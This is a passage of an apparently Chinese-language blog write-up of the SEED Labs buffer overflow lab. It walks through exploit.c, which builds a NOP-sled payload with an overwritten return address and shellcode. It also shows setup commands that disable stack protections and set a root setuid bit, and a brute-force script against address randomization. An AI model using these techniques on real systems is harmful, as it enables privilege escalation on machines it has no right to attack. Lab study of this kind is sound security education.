<span class="token keyword">char</span> shellcode<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;...&quot;</span><span class="token punctuation">;</span>

<span class="token keyword">void</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span><span class="token operator">*</span>argv<span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">517</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    FILE <span class="token operator">*</span>badfile<span class="token punctuation">;</span>
    <span class="token comment">/* Initialize buffer with 0x90 (NOP instruction) */</span>
    <span class="token function">memset</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>buffer<span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token number">517</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token comment">/* You need to fill the buffer with appropriate contents here */</span> 
    <span class="token keyword">char</span> jump<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;\xbf\xff\xeb\xab&quot;</span><span class="token punctuation">;</span>
    <span class="token keyword">int</span> offset_jump <span class="token operator">=</span> <span class="token number">36</span><span class="token punctuation">;</span> 
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>jump<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        buffer<span class="token punctuation">[</span>offset_jump <span class="token operator">+</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> jump<span class="token punctuation">[</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>jump<span class="token punctuation">)</span> <span class="token operator">-</span> i <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">int</span> offset_shell <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        buffer<span class="token punctuation">[</span>offset_shell <span class="token operator">+</span> i<span class="token punctuation">]</span> <span class="token operator">=</span> shellcode<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>

    <span class="token comment">/* Save the contents to the file &quot;badfile&quot; */</span>
    badfile <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string">&quot;./badfile&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;w&quot;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fwrite</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token number">517</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> badfile<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">fclose</span><span class="token punctuation">(</span>badfile<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br><span class="line-number">14</span><br><span class="line-number">15</span><br><span class="line-number">16</span><br><span class="line-number">17</span><br><span class="line-number">18</span><br><span class="line-number">19</span><br><span class="line-number">20</span><br><span class="line-number">21</span><br><span class="line-number">22</span><br><span class="line-number">23</span><br><span class="line-number">24</span><br><span class="line-number">25</span><br><span class="line-number">26</span><br><span class="line-number">27</span><br></div></div><p><em>stack.c</em> 中存在缓冲溢出的情况, 需要关闭栈保护, 并允许栈执行.</p> <h3 id="代码解释与说明"><a href="#代码解释与说明" class="header-anchor">#</a> 代码解释与说明</h3> <p>按照原理, 需要在 <em>stack.c</em> 中的 <code>bof</code> 函数的退出地址设置一个跳板, 跳板就是一个指向 shellcode 的地址. 而 shellcode 与跳板都在溢出的数据部分.
所以我们需要设置跳板与相应的 shellcode, 并写入溢出的数据部分, 这也是 <em>exploit.c</em> 的主要任务.</p> <p>13-21 行是主要修改内容.</p> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">char</span> jump<span class="token punctuation">[</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;\xbf\xff\xeb\xab&quot;</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>13 行中的 <code>0xbfffebab</code> 是 <em>stack.c</em> 中 <code>str</code> 的地址加上了 100B 的结果. 为什么是 100B? 这里我把 shellcode 放在了 buffer 100B 的位置. 为什么是加? 按照内存的栈结构, 数组被加载入栈后, 是从低位地址向高位地址储存的.</p> <p>这个 <code>str</code> 地址可以利用 gdb p &amp;str 打印出来 (应该是要在 <code>main</code> 函数这里打断点的, p 只能打印当前作用域的变量, 不是很准确.). 为什么不是 <code>bof</code> 函数中的 <code>buffer</code> 地址? 这个我不好说.</p> <div class="custom-block tip"><p class="custom-block-title">关于 gdb 无法打印 str 地址的情况</p> <p>具体原因不清楚, 听说是 gcc 编译过程做了一些优化, 删除了不必要的东西, 但是这些东西又会对 gdb 的调试造成影响. 将 stack 的编译指令替换成: <code>gcc -DBUF_SIZE=24 -gstabs+ -o stack -z execstack -fno-stack-protector stack.c</code> 即可</p></div> <div class="language-c line-numbers-mode"><pre class="language-c"><code><span class="token keyword">int</span> offset_jump <span class="token operator">=</span> <span class="token number">36</span><span class="token punctuation">;</span> 
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>14 行 <code>offet_jump</code>, 这个就是程序崩溃的地方, 利用 gdb run 一个精心设计过的 badfile, 会得到一个 invalid address, 同时 gdb 会说程序一共处理了 36B 的 buffer 数据. 我觉得这个非法地址就是 <code>bof</code> 的退出地址, 但是没有证据.</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code><span class="token keyword">for</span> <span class="token punctuation">(</span>int i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sizeof<span class="token punctuation">(</span>jump<span class="token punctuation">)</span> - <span class="token number">1</span><span class="token punctuation">;</span> i++<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>15 行的 <code>for</code> 这里要把跳板地址最后的 <code>\0</code> 去掉, <code>jump</code> 数组大小为 5B, 地址数据有 4B, 所以 <code>sizeof</code> 后面减了 1.</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>buffer<span class="token punctuation">[</span>offset_jump + i<span class="token punctuation">]</span> <span class="token operator">=</span> jump<span class="token punctuation">[</span>sizeof<span class="token punctuation">(</span>jump<span class="token punctuation">)</span> - i - <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>16 行地址加载的时候是逆序, 这个也是 gdb 告诉我的. 为什么是逆序? 我还没仔细想过.</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>int offset_shell <span class="token operator">=</span> <span class="token number">100</span><span class="token punctuation">;</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>18 行 <code>offset_shell</code> 这是 shellcode 相对 <code>str</code> 的偏移量, 就是说我把 shellcode 放在了 buffer 数组的第 100 个(0 计数)单元之后, 也可以设置成其他的.</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code><span class="token keyword">for</span> <span class="token punctuation">(</span>int i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> sizeof<span class="token punctuation">(</span>shellcode<span class="token punctuation">)</span><span class="token punctuation">;</span> i++<span class="token punctuation">)</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>19 行的 <code>sizeof</code> 不要减一, 具体原因不明.</p> <p>important 中的信息很重要. 优先编译 <em>stack.c</em>, 再编译 <em>exploit.c</em>.</p> <h3 id="操作流程"><a href="#操作流程" class="header-anchor">#</a> 操作流程</h3> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>$ <span class="token function">sudo</span> sysctl -w kernel.randomize_va_space<span class="token operator">=</span><span class="token number">0</span>
$ <span class="token function">sudo</span> <span class="token function">ln</span> -sf /bin/zsh /bin/sh
$ gcc -DBUF_SIZE<span class="token operator">=</span><span class="token number">24</span> -o stack -z execstack -fno-stack-protector stack.c
$ <span class="token function">sudo</span> <span class="token function">chown</span> root stack
$ <span class="token function">sudo</span> <span class="token function">chmod</span> <span class="token number">4755</span> stack
$ gcc -o exploit exploit.c
$ ./exploit
$ ./stack
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br></div></div><h3 id="结果"><a href="#结果" class="header-anchor">#</a> 结果</h3> <p>我按照上述操作流程试了几遍, 只能获得一个 <code>$</code> 的 shell.
<img src="/note/img/2020-02-10-14-15-31.png" alt=""></p> <div class="custom-block danger"><p class="custom-block-title">T2 的问题如果没有解决, 后面的问题就没办法直接解决.</p> <p>我的小伙伴表示, 使用 VM Ware 在同样的环境以及同样的操作下可以有理想的结果.</p></div> <h2 id="t3-defeating-dash’s-countermeasure"><a href="#t3-defeating-dash’s-countermeasure" class="header-anchor">#</a> T3 Defeating dash’s Countermeasure</h2> <p>之前说 dash 这个 shell 有些个问题, 会自动抛弃文件的 privilege. 现在尝试解决 dash 这个问题. 先把 shell 链接设置为 dash.</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code><span class="token function">sudo</span> <span class="token function">ln</span> -sf /bin/dash /bin/sh
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br></div></div><p>指导还是给出了一份代码 <em>dash_shell_test.c</em>:</p> <div class="language-c line-numbers-mode"><div class="highlight-lines"><br><br><br><br><br><br><br><div class="highlighted"> </div><br><br><br><br></div><pre class="language-c"><code><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h&gt;</span> </span>
<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h&gt;</span> </span>
<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span> 
    argv<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">&quot;/bin/sh&quot;</span><span class="token punctuation">;</span>
    argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token constant">NULL</span><span class="token punctuation">;</span>
    <span class="token comment">// setuid(0); </span>
    <span class="token function">execve</span><span class="token punctuation">(</span><span class="token string">&quot;/bin/sh&quot;</span><span class="token punctuation">,</span> argv<span class="token punctuation">,</span> <span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>
</code></pre><div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br></div></div><div class="custom-block tip"><p class="custom-block-title">TIP</p> <p>dash_shell_test.c 应该将文件归属设置为 root.</p></div> <ul><li><p>先注释掉 8 行的 <code>setuid</code> 方法, 运行.</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>gcc -o dash_shell_test dash_shell_test.c
<span class="token function">sudo</span> <span class="token function">chown</span> root dash_shell_test
./dash_shell_test
<span class="token function">sudo</span> <span class="token function">chmod</span> <span class="token number">4755</span> dash_shell_test
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br></div></div><p>可以得到一个 <code>$</code> 的 shell.</p></li> <li><p>取消注释 8 行的 <code>setuid</code> 方法, 运行.</p> <p>还是一个 <code>$</code> 的 shell.</p></li></ul> <div class="custom-block danger"><p class="custom-block-title">很明显这里的实验结果有问题.</p> <p>不知道 T2 的原因.</p></div> <p>最后还给了一段 shellcode, 替换原先的 shellcode 重复 T2. 更换之后, 会显示 segmentation fault, 但是 gdb run 还是正常的, 仍然是一个 <code>$</code> 的 shell(bash).</p> <h2 id="t4-defeating-address-randomization"><a href="#t4-defeating-address-randomization" class="header-anchor">#</a> T4 Defeating Address Randomization</h2> <p>想办法干掉地址随机化. 为什么要使用 32 位的 OS 🐶 . 可以使用暴力破解的方式搞到需要的内存地址.</p> <p>首先关闭地址随机化的机制.</p> <p>用于暴力破解的脚本 <em>brutal.sh</em></p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code><span class="token shebang important">#!/bin/bash </span>
<span class="token assign-left variable"><span class="token environment constant">SECONDS</span></span><span class="token operator">=</span><span class="token number">0</span>
<span class="token assign-left variable">value</span><span class="token operator">=</span><span class="token number">0</span>
<span class="token keyword">while</span> <span class="token punctuation">[</span> <span class="token number">1</span> <span class="token punctuation">]</span> 
    <span class="token keyword">do</span>
    <span class="token assign-left variable">value</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span> $value <span class="token operator">+</span> <span class="token number">1</span> <span class="token variable">))</span></span> 
    <span class="token assign-left variable">duration</span><span class="token operator">=</span><span class="token environment constant">$SECONDS</span> 
    <span class="token assign-left variable">min</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>$duration <span class="token operator">/</span> <span class="token number">60</span><span class="token variable">))</span></span> 
    <span class="token assign-left variable">sec</span><span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>$duration <span class="token operator">%</span> <span class="token number">60</span><span class="token variable">))</span></span>
    <span class="token builtin class-name">echo</span> <span class="token string">&quot;<span class="token variable">$min</span> minutes and <span class="token variable">$sec</span> seconds elapsed.&quot;</span>
    <span class="token builtin class-name">echo</span> <span class="token string">&quot;The program has been running <span class="token variable">$value</span> times so far.&quot;</span> 
    ./stack
<span class="token keyword">done</span>
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br><span class="line-number">3</span><br><span class="line-number">4</span><br><span class="line-number">5</span><br><span class="line-number">6</span><br><span class="line-number">7</span><br><span class="line-number">8</span><br><span class="line-number">9</span><br><span class="line-number">10</span><br><span class="line-number">11</span><br><span class="line-number">12</span><br><span class="line-number">13</span><br></div></div><p>指令:</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>$ <span class="token function">sudo</span> /sbin/sysctl -w kernel.randomize_va_space<span class="token operator">=</span><span class="token number">2</span>
$ <span class="token function">sh</span> ./brutal.sh
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><p>这段脚本需要跑一段时间. 测试的次数不应该超过 <code>2^19</code>. 乘着这个时间看一下 T5 和 T6.</p> <p><img src="/note/img/2020-02-10-18-03-03.png" alt=""></p> <p>这是结果, 大概用了两个小时.</p> <h2 id="t5-turn-on-the-stackguard-protection"><a href="#t5-turn-on-the-stackguard-protection" class="header-anchor">#</a> T5 Turn on the StackGuard Protection</h2> <p>打开栈守卫保护.</p> <div class="custom-block tip"><p class="custom-block-title">重要</p> <p>进行 T5 前先关闭地址随机化, 以便观察栈守卫的作用.</p></div> <p>在 stack-protector 在场的情况重复之前的实验, 不出意外是有错误的.</p> <div class="language-sh line-numbers-mode"><pre class="language-sh"><code>$ <span class="token function">sudo</span> sysctl -w kernel.randomize_va_space<span class="token operator">=</span><span class="token number">0</span>
?
</code></pre> <div class="line-numbers-wrapper"><span class="line-number">1</span><br><span class="line-number">2</span><br></div></div><h2 id="t6-turn-on-the-non-executable-stack-protection"><a href="#t6-turn-on-the-non-executable-stack-protection" class="header-anchor">#</a> T6 Turn on the Non-executable Stack Protection</h2> <p>打开不可执行栈的保护.</p> <div class="custom-block tip"><p class="custom-block-title">重要</p> <p>和 T5 一样, 需要先关闭地址随机化, 以便观察不可执行栈的保护机制.</p></div> <p>重复 T2. 我 jio 得吧, 是会报错的. 直觉上, 可执行栈就像指针一样, 提供了对随意修改栈内地址操作的机会.</p></div> <footer class="page-edit"><!----> <div class="last-updated"><span class="prefix">Last Updated:</span> <span class="time">7/30/2020, 11:43:12 PM</span></div></footer> <div class="page-nav"><p class="inner"><span class="prev">
      ←
      <a href="/log/seed_labs/SQL Injection Attack Lab.html" class="prev">SQL Injection Attack Lab</a></span> <span class="next"><a href="/log/seed_labs/Packet Sniffing and Spoofing Lab.html">Packet Sniffing and Spoofing Lab</a>
      →
    </span></p></div> </main></div><div class="global-ui"></div></div>
    <script src="/assets/js/app.27d58fa7.js" defer></script><script src="/assets/js/2.f1f09924.js" defer></script><script src="/assets/js/35.15ecee78.js" defer></script>
  </body>
</html>
